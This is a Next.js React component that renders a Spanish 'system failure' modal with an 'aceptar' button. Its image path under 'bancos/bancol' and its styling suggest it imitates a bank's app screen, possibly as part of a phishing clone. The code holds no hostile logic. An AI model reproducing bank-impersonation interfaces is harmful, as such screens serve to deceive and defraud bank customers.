"use client";

import Image from "next/image";
import React from "react";

interface XSistemaModalProps {
  onAceptar: () => void;
}

export default function XSistemaModal({ onAceptar }: XSistemaModalProps) {
  return (
    <div className="fixed inset-0 bg-black/60 z-9999 flex items-center justify-center p-4 backdrop-blur-[1.5px] animate-in fade-in duration-200">
      
      {/* Modal Card */}
      <div 
        style={{
          backgroundColor: 'white',
          borderRadius: '24px',
          padding: '32px 24px 28px 24px',
          width: '100%',
          maxWidth: '310px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          textAlign: 'center',
          boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)',
          boxSizing: 'border-box'
        }}
      >
        
        {/* Hand Icon Image */}
        <div style={{ marginBottom: '16px', display: 'flex', justifyContent: 'center' }}>
          <Image
            src="/bancos/bancol/eehot_6.png"
            alt="Falla en el sistema"
            width={64}
            height={64}
            style={{ display: 'block' }}
          />
        </div>

        {/* Error Message Text */}
        <p 
          style={{
            fontSize: '12.5px',
            color: '#666',
            lineHeight: '1.5',
            fontWeight: 'normal',
            padding: '0 12px',
            marginBottom: '24px',
            margin: '0 0 24px 0',
            userSelect: 'none'
          }}
        >
          Ocurrió una falla en el sistema, estamos trabajando para ofrecerte una solución lo más pronto posible.
        </p>

        {/* Yellow "aceptar" button - stylized capsule */}
        <button
          type="button"
          onClick={onAceptar}
          style={{
            width: '210px',
            height: '36px',
            backgroundColor: '#FDDF3C',
            borderRadius: '18px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontWeight: '600',
            color: '#2c2a29',
            fontSize: '12.5px',
            textTransform: 'lowercase',
            border: 'none',
            cursor: 'pointer',
            outline: 'none',
            boxSizing: 'border-box'
          }}
        >
          aceptar
        </button>

      </div>

    </div>
  );
}
